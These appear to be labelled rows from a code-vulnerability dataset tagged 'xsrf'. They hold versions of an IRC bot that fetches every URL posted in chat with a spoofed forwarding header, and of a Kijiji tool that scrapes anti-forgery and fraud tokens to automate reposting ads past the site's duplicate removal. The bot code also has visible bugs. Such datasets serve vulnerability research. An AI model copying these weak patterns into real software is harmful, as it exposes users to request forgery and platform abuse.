        line=c.recvline(block=True)
        if not line:
            continue
        sys.stderr.write(""%s\n"" % line.encode('utf-8', 'replace'))
        line=c.parse(line=line)
        if line and line[""cmd""]==""PRIVMSG"":
            if line[""dest""]==NICK:
                if line[""msg""]==u""Get out of this channel!"": # A small hack
                    c.quit(u""%s asked to leave."" % line[""nick""])
                    quiting=True
            else:
                CHAN=line[""dest""]
                for w in line[""msg""].split():
                    w=ParseURL(w)
                    if w:
                        w=w.split("">"", 1)[0].split('""', 1)[0]
                        if re.match(""https?:/*git.io(/|$)"", w): # Fix buggy git.io
                            continue
                        opener=urllib2.build_opener()
                        opener.addheaders = [(""Accept-Charset"", ""utf-8, iso-8859-1""), (""Accept-Language"", ""zh-cn, zh-hans, zh-tw, zh-hant, zh, en-us, en-gb, en""), (""Range"", ""bytes=0-16383""), (""User-Agent"", ""Mozilla/5.0 (compatible; Titlebot; like IRCbot; +https://github.com/m13253/titlebot)""), (""X-Forwarded-For"", ""10.2.0.101""), (""X-moz"", ""prefetch""), (""X-Prefetch"", ""yes""), (""X-Requested-With"", ""Titlebot"")]
                        h=opener.open(w.encode(""utf-8"", ""replace""))
                        if h.code==200 or h.code==206:
                            if not ""Content-Type"" in h.info() or h.info()[""Content-Type""].split("";"")[0]==""text/html"":
                                wbuf=h.read(16384)
                                read_times=1
                                while len(wbuf)<16384 and read_times<4:
                                    read_times+=1
                                    wbuf_=h.read(16384)
                                    if wbuf_:
                                        wbuf+=wbuf_
                                    else:
                                        break
                                if ""Content-Encoding"" in h.info() and h.info()[""Content-Encoding""]==""gzip"": # Fix buggy www.bilibili.tv
                                    try:
                                        gunzip_obj=zlib.decompressobj(16+zlib.MAX_WBITS)
                                        wbuf=gunzip_obj.decompress(wbuf)
                                    except:
                                        pass
                                if wbuf.find(""<title>"")!=-1:
                                    titleenc=wbuf.split(""<title>"")[1].split(""</title>"")[0]
                                    title=None
                                    for enc in (""utf-8"", ""gbk"", ""gb18030"", ""iso-8859-1""):
                                        try:
                                            title=titleenc.decode(enc)
                                            break
                                        except UnicodeDecodeError:
                                            pass
                                    if title==None:
                                        title=title.decode(""utf-8"", ""replace"")
                                    title=html_parser.unescape(title).replace(""\r"", """").replace(""\n"", "" "").strip()
                                    c.say(CHAN, u""⇪标题: %s"" % title)
                                else:
                                    c.say(CHAN, u""⇪无标题网页"")
                            else:
                                if ""Content-Range"" in h.info():
                                    c.say(CHAN, u""⇪文件类型: %s, 文件大小: %s 字节\r\n"" % (h.info()[""Content-Type""], h.info()[""Content-Range""].split(""/"")[1]))
                                elif ""Content-Length"" in h.info():
                                    c.say(CHAN, u""⇪文件类型: %s, 文件大小: %s 字节\r\n"" % (h.info()[""Content-Type""], h.info()[""Content-Length""]))
                                else:
                                    c.say(CHAN, u""⇪文件类型: %s\r\n"" % h.info()[""Content-Type""])
                        else:
                            c.say(CHAN, u""⇪HTTP %d 错误\r\n"" % h.code)
    except Exception as e:
        try:
            c.say(CHAN, u""哎呀，%s 好像出了点问题: %s"" % (NICK, e))
        except:
            pass
    except socket.error as e:
        sys.stderr.write(""Error: %s\n"", e)
        c.quit(""Network error."")

# vim: et ft=python sts=4 sw=4 ts=4
/n/n/n",0,xsrf
1,17,4164d239f0f59b9ef04e3d168e68f958991fe88f,"/titlebot.py/n/n#!/usr/bin/env python2
# coding: utf-8

import os
import sys
import socket
import string
import time
import urllib2
import HTMLParser
import zlib

import libirc

HOST=""irc.freenode.net""
PORT=6667
NICK=""titlebot""
IDENT=""titlebot""
REALNAME=""titlebot""
CHANS=[""##Orz""]

def ParseURL(s):
    http_idx=s.find('http:')
    https_idx=s.find('https:')
    if https_idx==-1:
        if http_idx==-1:
            return None
        else:
            return s[http_idx:]
    else:
        if http_idx==-1:
            return s[https_idx:]
        else:
            return s[min(http_idx, https_idx):]

try:
    c=libirc.IRCConnection()
    c.connect((HOST, PORT))
    c.setnick(NICK)
    c.setuser(IDENT, REALNAME)
    for CHAN in CHANS:
        c.join(CHAN)
except:
    time.sleep(10)
    sys.stderr.write(""Restarting...\n"")
    os.execlp(""python2"", ""python2"", __file__)
    raise
CHAN=CHANS[0]
socket.setdefaulttimeout(10)

html_parser=HTMLParser.HTMLParser()

quiting=False
while not quiting:
    if not c.sock:
        quiting=True
        time.sleep(10)
        sys.stderr.write(""Restarting...\n"")
        os.execlp(""python2"", ""python2"", __file__)
        break
    try:
        line=c.recvline(block=True)
        if not line:
            continue
        sys.stderr.write(""%s\n"" % line.encode('utf-8', 'replace'))
        line=c.parse(line=line)
        if line and line[""cmd""]==""PRIVMSG"":
            if line[""dest""]==NICK:
                if line[""msg""]==u""Get out of this channel!"": # A small hack
                    c.quit(u""%s asked to leave."" % line[""nick""])
                    quiting=True
            else:
                CHAN=line[""dest""]
                for w in line[""msg""].split():
                    w=ParseURL(w)
                    if w:
                        w=w.split("">"", 1)[0].split('""', 1)[0]
                        if re.match(""https?:/*git.io(/|$)"", w): # Fix buggy git.io
                            continue
                        opener=urllib2.build_opener()
                        opener.addheaders = [(""Accept-Charset"", ""utf-8, iso-8859-1""), (""Accept-Language"", ""zh-cn, zh-hans, zh-tw, zh-hant, zh, en-us, en-gb, en""), (""Range"", ""bytes=0-16383""), (""User-Agent"", ""Mozilla/5.0 (compatible; Titlebot; like IRCbot; +https://github.com/m13253/titlebot)""), (""X-Forwarded-For"", ""10.2.0.101""), (""X-moz"", ""prefetch""), (""X-Prefetch"", ""yes"")]
                        h=opener.open(w.encode(""utf-8"", ""replace""))
                        if h.code==200 or h.code==206:
                            if not ""Content-Type"" in h.info() or h.info()[""Content-Type""].split("";"")[0]==""text/html"":
                                wbuf=h.read(16384)
                                read_times=1
                                while len(wbuf)<16384 and read_times<4:
                                    read_times+=1
                                    wbuf_=h.read(16384)
                                    if wbuf_:
                                        wbuf+=wbuf_
                                    else:
                                        break
                                if ""Content-Encoding"" in h.info() and h.info()[""Content-Encoding""]==""gzip"": # Fix buggy www.bilibili.tv
                                    try:
                                        gunzip_obj=zlib.decompressobj(16+zlib.MAX_WBITS)
                                        wbuf=gunzip_obj.decompress(wbuf)
                                    except:
                                        pass
                                if wbuf.find(""<title>"")!=-1:
                                    titleenc=wbuf.split(""<title>"")[1].split(""</title>"")[0]
                                    title=None
                                    for enc in (""utf-8"", ""gbk"", ""gb18030"", ""iso-8859-1""):
                                        try:
                                            title=titleenc.decode(enc)
                                            break
                                        except UnicodeDecodeError:
                                            pass
                                    if title==None:
                                        title=title.decode(""utf-8"", ""replace"")
                                    title=html_parser.unescape(title).replace(""\r"", """").replace(""\n"", "" "").strip()
                                    c.say(CHAN, u""⇪标题: %s"" % title)
                                else:
                                    c.say(CHAN, u""⇪无标题网页"")
                            else:
                                if ""Content-Range"" in h.info():
                                    c.say(CHAN, u""⇪文件类型: %s, 文件大小: %s 字节\r\n"" % (h.info()[""Content-Type""], h.info()[""Content-Range""].split(""/"")[1]))
                                elif ""Content-Length"" in h.info():
                                    c.say(CHAN, u""⇪文件类型: %s, 文件大小: %s 字节\r\n"" % (h.info()[""Content-Type""], h.info()[""Content-Length""]))
                                else:
                                    c.say(CHAN, u""⇪文件类型: %s\r\n"" % h.info()[""Content-Type""])
                        else:
                            c.say(CHAN, u""⇪HTTP %d 错误\r\n"" % h.code)
    except Exception as e:
        try:
            c.say(CHAN, u""哎呀，%s 好像出了点问题: %s"" % (NICK, e))
        except:
            pass
    except socket.error as e:
        sys.stderr.write(""Error: %s\n"", e)
        c.quit(""Network error."")

# vim: et ft=python sts=4 sw=4 ts=4
/n/n/n",1,xsrf
2,38,e64a478b09842d55be64a7cf7badb83ac3eb6493,"kijiji_repost_headless/__main__.py/n/nimport argparse
import os
import sys
from time import sleep

import kijiji_api
import generate_inf_file as generator

if sys.version_info < (3, 0):
    raise Exception(""This program requires Python 3.0 or greater"")


def main():
    parser = argparse.ArgumentParser(description=""Post ads on Kijiji"")
    parser.add_argument('-u', '--username', help='username of your kijiji account')
    parser.add_argument('-p', '--password', help='password of your kijiji account')

    subparsers = parser.add_subparsers(help='sub-command help')

    post_parser = subparsers.add_parser('post', help='post a new ad')
    post_parser.add_argument('inf_file', type=str, help='.inf file containing posting details')
    post_parser.set_defaults(function=post_ad)

    folder_parser = subparsers.add_parser('folder', help='post ad from folder')
    folder_parser.add_argument('folder_name', type=str, help='folder containing ad details')
    folder_parser.set_defaults(function=post_folder)

    repost_folder_parser = subparsers.add_parser('repost_folder', help='post ad from folder')
    repost_folder_parser.add_argument('folder_name', type=str, help='folder containing ad details')
    repost_folder_parser.set_defaults(function=repost_folder)

    show_parser = subparsers.add_parser('show', help='show currently listed ads')
    show_parser.set_defaults(function=show_ads)

    delete_parser = subparsers.add_parser('delete', help='delete a listed ad')
    delete_parser.add_argument('id', type=str, help='id of the ad you wish to delete')
    delete_parser.set_defaults(function=delete_ad)

    nuke_parser = subparsers.add_parser('nuke', help='delete all ads')
    nuke_parser.set_defaults(function=nuke)

    check_parser = subparsers.add_parser('check_ad', help='check if ad is active')
    check_parser.add_argument('folder_name', type=str, help='folder containing ad details')
    check_parser.set_defaults(function=check_ad)

    repost_parser = subparsers.add_parser('repost', help='repost an existing ad')
    repost_parser.add_argument('inf_file', type=str, help='.inf file containing posting details')
    repost_parser.set_defaults(function=repost_ad)

    build_parser = subparsers.add_parser('build_ad', help='Generates the item.inf file for a new ad')
    build_parser.set_defaults(function=generate_inf_file)

    args = parser.parse_args()
    try:
        args.function(args)
    except AttributeError:
        parser.print_help()


def get_folder_data(args):
    """"""
    Set ad data inf file and extract login credentials from inf files
    """"""
    args.inf_file = ""item.inf""
    cred_file = args.folder_name + ""/login.inf""
    creds = [line.strip() for line in open(cred_file, 'r')]
    args.username = creds[0]
    args.password = creds[1]


def get_inf_details(inf_file):
    """"""
    Extract ad data from inf file
    """"""
    with open(inf_file, 'rt') as infFileLines:
        data = {key: val for line in infFileLines for (key, val) in (line.strip().split(""=""),)}
    files = [open(picture, 'rb').read() for picture in data['imageCsv'].split("","")]
    return [data, files]


def post_folder(args):
    """"""
    Post new ad from folder
    """"""
    get_folder_data(args)
    os.chdir(args.folder_name)
    post_ad(args)


def post_ad(args):
    """"""
    Post new ad
    """"""
    [data, image_files] = get_inf_details(args.inf_file)
    attempts = 1
    while not check_ad(args) and attempts < 5:
        if attempts > 1:
            print(""Failed Attempt #{}, trying again."".format(attempts))
        attempts += 1
        api = kijiji_api.KijijiApi()
        api.login(args.username, args.password)
        api.post_ad_using_data(data, image_files)
    if not check_ad(args):
        print(""Failed Attempt #{}, giving up."".format(attempts))


def show_ads(args):
    """"""
    Print list of all ads
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    [print(""{} '{}'"".format(ad_id, ad_name)) for ad_name, ad_id in api.get_all_ads()]


def delete_ad(args):
    """"""
    Delete ad
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    api.delete_ad(args.id)


def delete_ad_using_title(name):
    """"""
    Delete ad based on ad title
    """"""
    api = kijiji_api.KijijiApi()
    api.delete_ad_using_title(name)


def repost_ad(args):
    """"""
    Repost ad

    Try to delete ad with same title if possible before reposting new ad
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    del_ad_name = """"
    for line in open(args.inf_file, 'rt'):
        [key, val] = line.strip().rstrip(""\n"").split(""="")
        if key == ""postAdForm.title"":
            del_ad_name = val
    try:
        api.delete_ad_using_title(del_ad_name)
        print(""Existing ad deleted before reposting"")
    except kijiji_api.DeleteAdException:
        print(""Did not find an existing ad with matching title, skipping ad deletion"")
        pass
    # Must wait a bit before posting the same ad even after deleting it, otherwise Kijiji will automatically remove it
    sleep(180)
    post_ad(args)


def repost_folder(args):
    """"""
    Repost ad from folder
    """"""
    get_folder_data(args)
    os.chdir(args.folder_name)
    repost_ad(args)


def check_ad(args):
    """"""
    Check if ad is live
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    ad_name = """"
    for line in open(args.inf_file, 'rt'):
        [key, val] = line.strip().rstrip(""\n"").split(""="")
        if key == ""postAdForm.title"":
            ad_name = val
    all_ads = api.get_all_ads()
    return [t for t, i in all_ads if t == ad_name]


def nuke(args):
    """"""
    Delete all ads
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    all_ads = api.get_all_ads()
    [api.delete_ad(ad_id) for ad_name, ad_id in all_ads]


def generate_inf_file():
    generator.run_program()


if __name__ == ""__main__"":
    main()
/n/n/nkijiji_repost_headless/kijiji_api.py/n/nimport json
import re
import sys
from time import strftime

import bs4
import requests
import yaml

if sys.version_info < (3, 0):
    raise Exception(""This program requires Python 3.0 or greater"")


class KijijiApiException(Exception):
    """"""
    Custom KijijiApi exception class
    """"""
    def __init__(self, msg=""KijijiApi exception encountered."", dump=None):
        self.msg = msg
        self.dumpfilepath = """"
        if dump:
            self.dumpfilepath = ""kijijiapi_dump_{}.txt"".format(strftime(""%Y%m%dT%H%M%S""))
            with open(self.dumpfilepath, 'a') as f:
                f.write(dump)

    def __str__(self):
        if self.dumpfilepath:
            return ""{}\nSee {} in current directory for latest dumpfile."".format(self.msg, self.dumpfilepath)
        else:
            return self.msg


def get_token(html, attrib_name):
    """"""
    Return value of first match for element with name attribute
    """"""
    soup = bs4.BeautifulSoup(html, 'html.parser')
    res = soup.select(""[name={}]"".format(attrib_name))
    if not res:
        raise KijijiApiException(""Element with name attribute '{}' not found in html text."".format(attrib_name), html)
    return res[0]['value']


def get_kj_data(html):
    """"""
    Return dict of Kijiji page data
    The 'window.__data' JSON object contains many useful key/values
    """"""
    soup = bs4.BeautifulSoup(html, 'html.parser')
    p = re.compile('window.__data=(.*);')
    script_list = soup.find_all(""script"", {""src"": False})
    for script in script_list:
        if script:
            m = p.search(script.string)
            if m:
                return json.loads(m.group(1))
    raise KijijiApiException(""'__data' JSON object not found in html text."", html)


def get_xsrf_token(html):
    """"""
    Return XSRF token
    This function is only necessary for the 'm-my-ads.html' page, as this particular page
    does not contain the usual 'ca.kijiji.xsrf.token' hidden HTML form input element, which is easier to scrape
    """"""
    soup = bs4.BeautifulSoup(html, 'html.parser')
    p = re.compile('Zoop\.init\(.*config: ({.+?}).*\);')
    for script in soup.find_all(""script"", {""src"": False}):
        if script:
            m = p.search(script.string.replace(""\n"", """"))
            if m:
                # Using yaml to load since this is not valid JSON
                return yaml.load(m.group(1))['token']
    raise KijijiApiException(""XSRF token not found in html text."", html)


class KijijiApi:
    """"""
    All functions require to be logged in to Kijiji first in order to function correctly
    """"""
    def __init__(self):
        config = {}
        self.session = requests.Session()

    def login(self, username, password):
        """"""
        Login to Kijiji for the current session
        """"""
        login_url = 'https://www.kijiji.ca/t-login.html'
        resp = self.session.get(login_url)
        payload = {
            'emailOrNickname': username,
            'password': password,
            'rememberMe': 'true',
            '_rememberMe': 'on',
            'ca.kijiji.xsrf.token': get_token(resp.text, 'ca.kijiji.xsrf.token'),
            'targetUrl': get_kj_data(resp.text)['config']['targetUrl'],
        }
        resp = self.session.post(login_url, data=payload)
        if not self.is_logged_in():
            raise KijijiApiException(""Could not log in."", resp.text)

    def is_logged_in(self):
        """"""
        Return true if logged into Kijiji for the current session
        """"""
        return ""Sign Out"" in self.session.get('https://www.kijiji.ca/m-my-ads.html/').text

    def logout(self):
        """"""
        Logout of Kijiji for the current session
        """"""
        self.session.get('https://www.kijiji.ca/m-logout.html')

    def delete_ad(self, ad_id):
        """"""
        Delete ad based on ad ID
        """"""
        my_ads_page = self.session.get('https://www.kijiji.ca/m-my-ads.html')
        params = {
            'Action': 'DELETE_ADS',
            'Mode': 'ACTIVE',
            'needsRedirect': 'false',
            'ads': '[{{""adId"":""{}"",""reason"":""PREFER_NOT_TO_SAY"",""otherReason"":""""}}]'.format(ad_id),
            'ca.kijiji.xsrf.token': get_xsrf_token(my_ads_page.text),
        }
        resp = self.session.post('https://www.kijiji.ca/j-delete-ad.json', data=params)
        if ""OK"" not in resp.text:
            raise KijijiApiException(""Could not delete ad."", resp.text)

    def delete_ad_using_title(self, title):
        """"""
        Delete ad based on ad title
        """"""
        all_ads = self.get_all_ads()
        [self.delete_ad(i) for t, i in all_ads if t.strip() == title.strip()]

    def upload_image(self, token, image_files=[]):
        """"""
        Upload one or more photos to Kijiji

        'image_files' is a list of binary objects corresponding to images
        """"""
        image_urls = []
        image_upload_url = 'https://www.kijiji.ca/p-upload-image.html'
        for img_file in image_files:
            for i in range(0, 3):
                r = self.session.post(image_upload_url, files={'file': img_file}, headers={""X-Ebay-Box-Token"": token})
                r.raise_for_status()
                try:
                    image_tree = json.loads(r.text)
                    img_url = image_tree['thumbnailUrl']
                    print(""Image Upload success on try #{}"".format(i+1))
                    image_urls.append(img_url)
                    break
                except (KeyError, ValueError):
                    print(""Image Upload failed on try #{}"".format(i+1))
        return [image for image in image_urls if image is not None]

    def post_ad_using_data(self, data, image_files=[]):
        """"""
        Post new ad

        'data' is a dictionary of ad data that to be posted
        'image_files' is a list of binary objects corresponding to images to upload
        """"""
        # Load ad posting page (arbitrary category)
        resp = self.session.get('https://www.kijiji.ca/p-admarkt-post-ad.html?categoryId=15')

        # Get token required for upload
        m = re.search(r""initialXsrfToken: '(\S+)'"", resp.text)
        if m:
            image_upload_token = m.group(1)
        else:
            raise KijijiApiException(""'initialXsrfToken' not found in html text."", resp.text)

        # Upload the images
        image_list = self.upload_image(image_upload_token, image_files)
        data['images'] = "","".join(image_list)

        # Retrieve XSRF tokens
        data['ca.kijiji.xsrf.token'] = get_token(resp.text, 'ca.kijiji.xsrf.token')
        data['postAdForm.fraudToken'] = get_token(resp.text, 'postAdForm.fraudToken')

        # Format ad data and check constraints
        data['postAdForm.description'] = data['postAdForm.description'].replace(""\\n"", ""\n"")
        title_len = len(data.get(""postAdForm.title"", """"))
        if not title_len >= 10:
            raise KijijiApiException(""Your ad title is too short! (min 10 chars)"")
        if title_len > 64:
            raise KijijiApiException(""Your ad title is too long! (max 64 chars)"")

        # Upload the ad itself
        new_ad_url = ""https://www.kijiji.ca/p-submit-ad.html""
        resp = self.session.post(new_ad_url, data=data)
        resp.raise_for_status()
        if ""Delete Ad?"" not in resp.text:
            if ""There was an issue posting your ad, please contact Customer Service."" in resp.text:
                raise KijijiApiException(""Could not post ad; this user is banned."", resp.text)
            else:
                raise KijijiApiException(""Could not post ad."", resp.text)

        # Extract ad ID from response set-cookie
        ad_id = re.search('kjrva=(\d+)', resp.headers['Set-Cookie']).group(1)

        return ad_id

    def get_all_ads(self):
        """"""
        Return an iterator of tuples containing the ad title and ad ID for every ad
        """"""
        resp = self.session.get('https://www.kijiji.ca/m-my-ads.html')
        user_id = get_kj_data(resp.text)['config']['userId']
        my_ads_url = 'https://www.kijiji.ca/j-get-my-ads.json?currentOffset=0&show=ACTIVE&user={}'.format(user_id)
        my_ads_page = self.session.get(my_ads_url)
        my_ads_tree = json.loads(my_ads_page.text)
        ad_ids = [entry['id'] for entry in my_ads_tree['myAdEntries']]
        ad_names = [entry['title'] for entry in my_ads_tree['myAdEntries']]
        return zip(ad_names, ad_ids)
/n/n/n",0,xsrf
3,39,e64a478b09842d55be64a7cf7badb83ac3eb6493,"/kijiji_repost_headless/__main__.py/n/nimport argparse
import os
import sys
from time import sleep

import kijiji_api
import generate_inf_file as generator

if sys.version_info < (3, 0):
    raise Exception(""This program requires Python 3.0 or greater"")


def main():
    parser = argparse.ArgumentParser(description=""Post ads on Kijiji"")
    parser.add_argument('-u', '--username', help='username of your kijiji account')
    parser.add_argument('-p', '--password', help='password of your kijiji account')

    subparsers = parser.add_subparsers(help='sub-command help')

    postParser = subparsers.add_parser('post', help='post a new ad')
    postParser.add_argument('inf_file', type=str, help='.inf file containing posting details')
    postParser.set_defaults(function=post_ad)

    folderParser = subparsers.add_parser('folder', help='post ad from folder')
    folderParser.add_argument('folderName', type=str, help='folder containing ad details')
    folderParser.set_defaults(function=post_folder)

    repostFolderParser = subparsers.add_parser('repost_folder', help='post ad from folder')
    repostFolderParser.add_argument('folderName', type=str, help='folder containing ad details')
    repostFolderParser.set_defaults(function=repost_folder)

    showParser = subparsers.add_parser('show', help='show currently listed ads')
    showParser.set_defaults(function=show_ads)

    deleteParser = subparsers.add_parser('delete', help='delete a listed ad')
    deleteParser.add_argument('id', type=str, help='id of the ad you wish to delete')
    deleteParser.set_defaults(function=delete_ad)

    nukeParser = subparsers.add_parser('nuke', help='delete all ads')
    nukeParser.set_defaults(function=nuke)

    checkParser = subparsers.add_parser('check_ad', help='check if ad is active')
    checkParser.add_argument('folderName', type=str, help='folder containing ad details')
    checkParser.set_defaults(function=check_ad)

    repostParser = subparsers.add_parser('repost', help='repost an existing ad')
    repostParser.add_argument('inf_file', type=str, help='.inf file containing posting details')
    repostParser.set_defaults(function=repost_ad)

    buildParser = subparsers.add_parser('build_ad', help='Generates the item.inf file for a new ad')
    buildParser.set_defaults(function=generate_inf_file)

    args = parser.parse_args()
    try:
        args.function(args)
    except AttributeError:
        parser.print_help()


def get_folder_data(args):
    """"""
    Set ad data inf file and extract login credentials from inf files
    """"""
    args.inf_file = ""item.inf""
    cred_file = args.folderName + ""/login.inf""
    creds = [line.strip() for line in open(cred_file, 'r')]
    args.username = creds[0]
    args.password = creds[1]


def get_inf_details(inf_file):
    """"""
    Extract ad data from inf file
    """"""
    with open(inf_file, 'rt') as infFileLines:
        data = {key: val for line in infFileLines for (key, val) in (line.strip().split(""=""),)}
    files = [open(picture, 'rb').read() for picture in data['imageCsv'].split("","")]
    return [data, files]


def post_folder(args):
    """"""
    Post new ad from folder
    """"""
    get_folder_data(args)
    os.chdir(args.folderName)
    post_ad(args)


def post_ad(args):
    """"""
    Post new ad
    """"""
    [data, imageFiles] = get_inf_details(args.inf_file)
    attempts = 1
    while not check_ad(args) and attempts < 5:
        if attempts > 1:
            print(""Failed Attempt #"" + str(attempts) + "", trying again."")
        attempts += 1
        api = kijiji_api.KijijiApi()
        api.login(args.username, args.password)
        api.post_ad_using_data(data, imageFiles)
        sleep(180)
    if not check_ad(args):
        print(""Failed Attempt #"" + str(attempts) + "", giving up."")


def show_ads(args):
    """"""
    Print list of all ads
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    [print(""{} '{}'"".format(adId, adName)) for adName, adId in api.get_all_ads()]


def delete_ad(args):
    """"""
    Delete ad
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    api.delete_ad(args.id)


def delete_ad_using_title(name):
    """"""
    Delete ad based on ad title
    """"""
    api = kijiji_api.KijijiApi()
    api.delete_ad_using_title(name)


def repost_ad(args):
    """"""
    Repost ad

    Try to delete ad with same title if possible before reposting new ad
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    delAdName = """"
    for line in open(args.inf_file, 'rt'):
        [key, val] = line.strip().rstrip(""\n"").split(""="")
        if key == ""postAdForm.title"":
            delAdName = val
    try:
        api.delete_ad_using_title(delAdName)
        print(""Existing ad deleted before reposting"")
    except kijiji_api.DeleteAdException:
        print(""Did not find an existing ad with matching title, skipping ad deletion"")
        pass
    # Must wait a bit before posting the same ad even after deleting it, otherwise Kijiji will automatically remove it
    sleep(180)
    post_ad(args)


def repost_folder(args):
    """"""
    Repost ad from folder
    """"""
    get_folder_data(args)
    os.chdir(args.folderName)
    repost_ad(args)


def check_ad(args):
    """"""
    Check if ad is live
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    AdName = """"
    for line in open(args.inf_file, 'rt'):
        [key, val] = line.strip().rstrip(""\n"").split(""="")
        if key == ""postAdForm.title"":
            AdName = val
    allAds = api.get_all_ads()
    return [t for t, i in allAds if t == AdName]


def nuke(args):
    """"""
    Delete all ads
    """"""
    api = kijiji_api.KijijiApi()
    api.login(args.username, args.password)
    allAds = api.get_all_ads()
    [api.delete_ad(adId) for adName, adId in allAds]

def generate_inf_file(args):
    generator.run_program()

if __name__ == ""__main__"":
    main()
/n/n/n/kijiji_repost_headless/kijiji_api.py/n/nimport requests
import json
import bs4
import re
import sys
from multiprocessing import Pool
from time import strftime

if sys.version_info < (3, 0):
    raise Exception(""This program requires Python 3.0 or greater"")


class KijijiApiException(Exception):
    """"""
    Custom KijijiApi exception class
    """"""
    def __init__(self, dump=None):
        self.dumpfilepath = """"
        if dump:
            self.dumpfilepath = ""kijiji_dump_{}.txt"".format(strftime(""%Y%m%dT%H%M%S""))
            with open(self.dumpfilepath, 'a') as f:
                f.write(dump)
    def __str__(self):
        if self.dumpfilepath:
            return ""See {} in current directory for latest dumpfile."".format(self.dumpfilepath)
        else:
            return """"

class SignInException(KijijiApiException):
    def __str__(self):
        return ""Could not sign in.\n""+super().__str__()

class PostAdException(KijijiApiException):
    def __str__(self):
        return ""Could not post ad.\n""+super().__str__()

class BannedException(KijijiApiException):
    def __str__(self):
        return ""Could not post ad, this user is banned.\n""+super().__str__()

class DeleteAdException(KijijiApiException):
    def __str__(self):
        return ""Could not delete ad.\n""+super().__str__()


def get_token(html, token_name):
    """"""
    Retrive CSRF token from webpage
    Tokens are different every time a page is visitied
    """"""
    soup = bs4.BeautifulSoup(html, 'html.parser')
    res = soup.select(""[name={}]"".format(token_name))
    if not res:
        print(""Token '{}' not found in html text."".format(token_name))
        return """"
    return res[0]['value']


class KijijiApi:
    """"""
    All functions require to be logged in to Kijiji first in order to function correctly
    """"""
    def __init__(self):
        config = {}
        self.session = requests.Session()

    def login(self, username, password):
        """"""
        Login to Kijiji for the current session
        """"""
        login_url = 'https://www.kijiji.ca/t-login.html'
        resp = self.session.get(login_url)
        payload = {
            'emailOrNickname': username,
            'password': password,
            'rememberMe': 'true',
            '_rememberMe': 'on',
            'ca.kijiji.xsrf.token': get_token(resp.text, 'ca.kijiji.xsrf.token'),
            'targetUrl': 'L3QtbG9naW4uaHRtbD90YXJnZXRVcmw9TDNRdGJHOW5hVzR1YUhSdGJEOTBZWEpuWlhSVmNtdzlUREpuZEZwWFVuUmlNalV3WWpJMGRGbFlTbXhaVXpoNFRucEJkMDFxUVhsWWJVMTZZbFZLU1dGVmJHdGtiVTVzVlcxa1VWSkZPV0ZVUmtWNlUyMWpPVkJSTFMxZVRITTBVMk5wVW5wbVRHRlFRVUZwTDNKSGNtVk9kejA5XnpvMnFzNmc2NWZlOWF1T1BKMmRybEE9PQ--'
            }
        resp = self.session.post(login_url, data=payload)
        if not self.is_logged_in():
            raise SignInException(resp.text)

    def is_logged_in(self):
        """"""
        Return true if logged into Kijiji for the current session
        """"""
        index_page_text = self.session.get('https://www.kijiji.ca/m-my-ads.html/').text
        return ""Sign Out"" in index_page_text

    def logout(self):
        """"""
        Logout of Kijiji for the current session
        """"""
        self.session.get('https://www.kijiji.ca/m-logout.html')

    def delete_ad(self, ad_id):
        """"""
        Delete ad based on ad ID
        """"""
        my_ads_page = self.session.get('https://www.kijiji.ca/m-my-ads.html')
        params = {
            'Action': 'DELETE_ADS',
            'Mode': 'ACTIVE',
            'needsRedirect': 'false',
            'ads': '[{{""adId"":""{}"",""reason"":""PREFER_NOT_TO_SAY"",""otherReason"":""""}}]'.format(ad_id),
            'ca.kijiji.xsrf.token': get_token(my_ads_page.text, 'ca.kijiji.xsrf.token')
            }
        resp = self.session.post('https://www.kijiji.ca/j-delete-ad.json', data=params)
        if (""OK"" not in resp.text):
            raise DeleteAdException(resp.text)

    def delete_ad_using_title(self, title):
        """"""
        Delete ad based on ad title
        """"""
        allAds = self.get_all_ads()
        [self.delete_ad(i) for t, i in allAds if t.strip() == title.strip()]

    def upload_image(self, token, image_files=[]):
        """"""
        Upload one or more photos to Kijiji concurrently using Pool

        'image_files' is a list of binary objects corresponding to images
        """"""
        image_urls = []
        image_upload_url = 'https://www.kijiji.ca/p-upload-image.html'
        for img_file in image_files:
            for i in range(0, 3):
                files = {'file': img_file}
                r = self.session.post(image_upload_url, files=files, headers={""x-ebay-box-token"": token})
                if (r.status_code != 200):
                    print(r.status_code)
                try:
                    image_tree = json.loads(r.text)
                    img_url = image_tree['thumbnailUrl']
                    print(""Image Upload success on try #{}"".format(i+1))
                    image_urls.append(img_url)
                    break
                except (KeyError, ValueError) as e:
                    print(""Image Upload failed on try #{}"".format(i+1))
        return [image for image in image_urls if image is not None]

    def post_ad_using_data(self, data, image_files=[]):
        """"""
        Post new ad

        'data' is a dictionary of ad data that to be posted
        'image_files' is a list of binary objects corresponding to images to upload
        """"""
        # Load ad posting page
        resp = self.session.get('https://www.kijiji.ca/p-admarkt-post-ad.html?categoryId=773')

        #Get tokens required for upload
        token_regex = r""initialXsrfToken: '\S+'""
        image_upload_token = re.findall(token_regex, resp.text)[0].strip(""initialXsrfToken: '"").strip(""'"")

        # Upload the images
        imageList = self.upload_image(image_upload_token, image_files)
        data['images'] = "","".join(imageList)

        # Retrive tokens for website
        data['ca.kijiji.xsrf.token'] = get_token(resp.text, 'ca.kijiji.xsrf.token')
        data['postAdForm.fraudToken'] = get_token(resp.text, 'postAdForm.fraudToken')
        data['postAdForm.description'] = data['postAdForm.description'].replace(""\\n"", ""\n"")

        # Upload the ad itself
        new_ad_url = ""https://www.kijiji.ca/p-submit-ad.html""
        resp = self.session.post(new_ad_url, data=data)
        if not len(data.get(""postAdForm.title"", """")) >= 10:
            raise AssertionError(""Your title is too short!"")
        if (int(resp.status_code) != 200 or \
                ""Delete Ad?"" not in resp.text):
            if ""There was an issue posting your ad, please contact Customer Service."" in resp.text:
                raise BannedException(resp.text)
            else:
                raise PostAdException(resp.text)

        # Get adId and return it
        new_cookie_with_ad_id = resp.headers['Set-Cookie']
        ad_id = re.search('\d+', new_cookie_with_ad_id).group()
        return ad_id

    def get_all_ads(self):
        """"""
        Return an iterator of tuples containing the ad title and ad ID for every ad
        """"""
